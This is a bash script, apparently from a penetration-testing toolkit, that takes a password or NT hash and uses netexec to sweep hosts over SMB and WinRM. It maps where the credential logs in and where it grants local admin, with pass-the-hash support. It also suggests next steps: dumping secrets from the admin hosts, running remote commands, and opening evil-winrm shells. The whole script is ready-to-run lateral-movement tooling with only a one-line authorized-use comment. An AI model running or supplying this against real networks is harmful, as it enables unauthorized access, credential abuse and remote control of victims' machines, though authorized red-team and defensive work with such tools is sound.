#!/usr/bin/env bash
#
# validate.sh - credential validation / "where am I admin?" sweep
# -----------------------------------------------------------------------------
# Takes a credential (password or NT hash) and a set of hosts, then checks where
# it authenticates and - crucially - where it grants LOCAL ADMIN. This is how
# you turn one cracked/sprayed credential into a foothold map.
#   1. Sweep SMB across all hosts; netexec flags '(Pwn3d!)' = local admin.
#   2. Optionally also test WinRM (remote shell access).
#   3. Summarise: authenticated hosts vs admin hosts.
# Works with cleartext or pass-the-hash; great after spray.sh / secretsdump.sh.
# -----------------------------------------------------------------------------
# AUTHORIZED USE ONLY: in-scope hosts only.
# -----------------------------------------------------------------------------
#
# USAGE:
#   ./validate.sh -t <host|CIDR|file> -u <user> (-p <pass> | -H <lm:nt>) \
#                 [-d domain] [--winrm] [-o out]
#
# EXAMPLES:
#   ./validate.sh -t 10.10.10.0/24 -u admin -p 'Pass123' -d corp.local
#   ./validate.sh -t hosts.txt -u svc -H :nthash -d corp.local --winrm
#
# DEPENDENCIES: netexec (nxc)
# -----------------------------------------------------------------------------

set -euo pipefail
c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok(){   printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_warn(){ printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err(){  printf '\033[1;31m[-]\033[0m %s\n' "$*" >&2; }
c_step(){ printf '\n\033[1;36m===== %s =====\033[0m\n' "$*"; }
have(){ command -v "$1" >/dev/null 2>&1; }

TGT="" USER="" PASS="" HASH="" DOMAIN="" WINRM="" OUT=""
usage(){ sed -n '2,26p' "$0"; exit 1; }
while getopts "t:u:p:H:d:o:h-:" o; do case "$o" in
  t) TGT=$OPTARG;; u) USER=$OPTARG;; p) PASS=$OPTARG;; H) HASH=$OPTARG;;
  d) DOMAIN=$OPTARG;; o) OUT=$OPTARG;;
  -) case "$OPTARG" in winrm) WINRM=1;; *) usage;; esac;;
  *) usage;;
esac; done
[ -z "$TGT" ] || [ -z "$USER" ] && { c_err "need -t and -u"; usage; }
[ -z "$PASS" ] && [ -z "$HASH" ] && { c_err "need -p or -H"; usage; }
NXC=""; for b in nxc netexec crackmapexec; do have "$b" && { NXC=$b; break; }; done
[ -z "$NXC" ] && { c_err "netexec not found"; exit 1; }

OUT=${OUT:-"./validate_$(date +%Y%m%d_%H%M%S)"}; mkdir -p "$OUT"; cd "$OUT"
AUTH=( -u "$USER" ); [ -n "$HASH" ] && AUTH+=( -H "$HASH" ) || AUTH+=( -p "$PASS" )
[ -n "$DOMAIN" ] && AUTH+=( -d "$DOMAIN" )

c_step "SMB sweep"
$NXC smb "$TGT" "${AUTH[@]}" 2>&1 | tee smb_sweep.txt || true
grep -iE '\(Pwn3d!\)' smb_sweep.txt | awk '{print $2}' | sort -u > admin_hosts.txt || true
grep -iE '\[\+\]' smb_sweep.txt | awk '{print $2}' | sort -u > auth_hosts.txt || true

if [ -n "$WINRM" ]; then
  c_step "WinRM sweep"
  $NXC winrm "$TGT" "${AUTH[@]}" 2>&1 | tee winrm_sweep.txt || true
  grep -iE '\(Pwn3d!\)' winrm_sweep.txt | awk '{print $2}' | sort -u > winrm_hosts.txt || true
fi

c_step "SUMMARY"
c_info "Authenticated on $(wc -l < auth_hosts.txt 2>/dev/null || echo 0) host(s)."
if [ -s admin_hosts.txt ]; then
  c_ok "LOCAL ADMIN (Pwn3d!) on:"; sed 's/^/   /' admin_hosts.txt
  c_info "Next: secretsdump.sh on these, or netexec smb <host> ... -x 'whoami' for exec."
else
  c_warn "No local-admin hosts for this credential."
fi
[ -s winrm_hosts.txt ] && { c_ok "WinRM shell available on:"; sed 's/^/   /' winrm_hosts.txt; c_info "Shell: evil-winrm -i <host> -u $USER ..."; }
c_ok "Output: $(pwd)"
